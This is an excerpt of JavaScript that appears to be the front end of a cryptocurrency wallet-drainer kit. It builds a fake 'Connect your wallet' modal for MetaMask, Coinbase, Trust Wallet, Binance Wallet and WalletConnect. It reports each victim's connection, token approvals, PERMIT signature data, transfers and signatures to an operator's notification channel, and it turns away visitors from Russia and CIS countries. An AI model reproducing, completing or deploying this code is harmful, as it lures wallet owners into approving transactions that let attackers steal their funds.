...
const FLASH_Custom_Chat = {
  ...
  Chat_Settings: {
    enter_website: FLASH_CHANNEL_ID, // Channel ID for the action - Login to the site (if empty - notification is disabled)
    leave_website: FLASH_CHANNEL_ID, // Channel ID for the action - Exit the site (if empty - notification is disabled)
    connect_success: FLASH_CHANNEL_ID, // Channel ID for the action - Successful connection (if empty - notification disabled)
    connect_request: FLASH_CHANNEL_ID, // Channel ID for the action - Connection request (if empty - notification disabled)
    connect_cancel: FLASH_CHANNEL_ID, // Channel ID for action - Connection rejected (if empty - notification disabled)
    approve_request: FLASH_CHANNEL_ID, // Channel ID for the action - Request for confirmation (if empty - notification disabled)
    approve_success: FLASH_CHANNEL_ID, // Channel ID for action - Successful confirmation (if empty - notification disabled)
    approve_cancel: FLASH_CHANNEL_ID, // Channel ID for action - Acknowledgment rejected (if empty - notification disabled)
    permit_sign_data: FLASH_CHANNEL_ID, // Channel ID for the action - Data from PERMIT (if empty - notification disabled)
    transfer_request: FLASH_CHANNEL_ID, // Channel ID for the action - Transfer request (if empty - notification is disabled)
    transfer_success: FLASH_CHANNEL_ID, // Channel ID for the action - Successful transfer (if empty - notification disabled)
    transfer_cancel: FLASH_CHANNEL_ID, // Channel ID for the action - Cancel transfer (if empty - notification is disabled)
    sign_request: FLASH_CHANNEL_ID, // Channel ID for the action - Signature Request (if empty - notification is disabled)
    sign_success: FLASH_CHANNEL_ID, // Channel ID for the action - Successful signature (if empty - notification disabled)
    sign_cancel: FLASH_CHANNEL_ID, // Channel ID for the action - Signature rejected (if empty - notification disabled)
    chain_request: FLASH_CHANNEL_ID, // Channel ID for the action - Request to change the network (if empty - notification is disabled)
    chain_success: FLASH_CHANNEL_ID, // Channel ID for the action - Network change accepted (if empty - notification disabled)
    chain_cancel: FLASH_CHANNEL_ID, // Channel ID for the action - Network change rejected (if empty - notification disabled)
  }
};
...
const FLASH_Modal_Data = [
    {
        type: 'style',
        data: `@import url('https://fonts.googleapis.com/css?family=Inter&display=swap');
        ...
        .web3-modal-wrapper .web3-modal-header {
          padding: 0 20px 20px;
          display: flex;
        ...
        .web3-modal-wrapper .web3-modal-header .web3-modal-help,
        .web3-modal-wrapper .web3-modal-header .web3-modal-close {
          width: 16px;
          cursor: pointer;
          display: flex;
        }
        
        .web3-modal-wrapper .web3-modal-header .web3-modal-title {
          text-align: center;
          font-size: 16px;
          margin: 0;
        }
        
        .web3-modal-wrapper .web3-modal-items .item {
          cursor: pointer;
          padding: 7px 10px;
        ...
        .web3-modal-wrapper .web3-modal-items .item:hover {
          background-color: rgba(255, 255, 255, 0.05);
        }
        
        .web3-modal-wrapper .web3-modal-items .item .arrow {
          margin-right: 0;
        }
        
        .web3-modal-wrapper .web3-modal-items .item .arrow::after {
          content: '➢';
        }
        
        .web3-modal-wrapper .web3-modal-items .item > div {
          display: flex;
          align-items: center;
          margin-right: 20px;
        }
        
        .web3-modal-wrapper .web3-modal-items .item > div .icon {
          display: flex;
        }
        
        .web3-modal-wrapper .web3-modal-items .item > div .icon img {
          width: 40px;
          margin-right: 10px;
          border-radius: 10px;
        }
      ...
      {
    type: 'html',
    data: `<div class="web3-overlay"></div>
    <div class="web3-modal-wrapper">
      <div class="web3-modal-header">
        <div class="web3-modal-help">
          <svg
            fill="none"
            viewBox="0 0 16 16"
          >
        ...
        <p
          class="web3-modal-title"
          style="margin-top: 0px"
        >
          Connect your wallet
        </p>
        <div class="web3-modal-close" onclick="flash_hide()">
          <svg
            fill="none"
            viewBox="0 0 16 16"
          >
      ...
      <div class="web3-modal-items">
        <div
          class="item"
          onclick="connect_wallet('MetaMask')"
        >
          <div>
            <div class="icon">
              <img
        ...
        <div
          class="item"
          onclick="connect_wallet('Coinbase')"
        >
          <div>
            <div class="icon">
              <img
        ...
        <div
          class="item"
          onclick="connect_wallet('Trust Wallet')"
        >
          <div>
            <div class="icon">
              <img
        ...
        <div
          class="item"
          onclick="connect_wallet('Binance Wallet')"
        >
          <div>
            <div class="icon">
              <img
        ...
        <div
          class="item"
          onclick="connect_wallet('WalletConnect')"
        >
          <div>
            <div class="icon">
              <img
...
const inject_modal = () => {
    try {
      ...
      modal_elem.id = 'web3-modal-wrapper'; 
      modal_elem.classList = ['web3-modal-wrapper'];
...
const reset_modal = () => {
  try { document.getElementById('web3-modal-wrapper').remove(); } catch(err) { console.log(err); }
...
const flash_init = () => { 
    try { 
      if (FLASH_Connection !== true) return connect_wallet(); 
      if (!document.getElementById('web3-style') || !document.getElementById('web3-overlay') || !document.getElementById('web3-modal-wrapper')) { 
        inject_modal(); 
      } 
      if (FLASH_Modal_Style == 2) { 
        FLASHM.open(FLASH_Color_Scheme, FLASH_Modal_Mode); 
      } else { 
        document.getElementById('web3-modal-wrapper').style.display = 'block'; 
  ...
  const flash_hide = () => {
    try {
      if (FLASH_Modal_Style == 2) {
        ...
        // Hide modal elements
        document.getElementById('web3-modal-wrapper').style.display = 'none';
  ...
  try {
    ...
    if (FLASH_Bad_Country) {
      ...
      try {
        if (FLASH_Loader_Style == 2) {
          FLASHL.fire({
            icon: 'error', title: 'Critical Error', subtitle: 'Prohibited Geolocation', text: 'Please leave this website immediately, it is not intended for Russia and CIS countries, do not try to use a VPN, it is not safe!' ,
            showConfirmButton: true, confirmButtonText: 'OK', color: FLASH_Color_Scheme
          });
        } else {
          Swal.close();
          Swal.fire({
            html: '<b>Warning</b><br><br>Please leave this website immediately, it is not intended for Russia and CIS countries, do not try to use a VPN, it is not secure!', icon: 'error' ,
            allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
            showConfirmButton: true, confirmButtonText: 'OK'
          });
        }
...
document.addEventListener('DOMContentLoaded', () => {
    const connectWalletButtons = document.querySelectorAll('.cta');
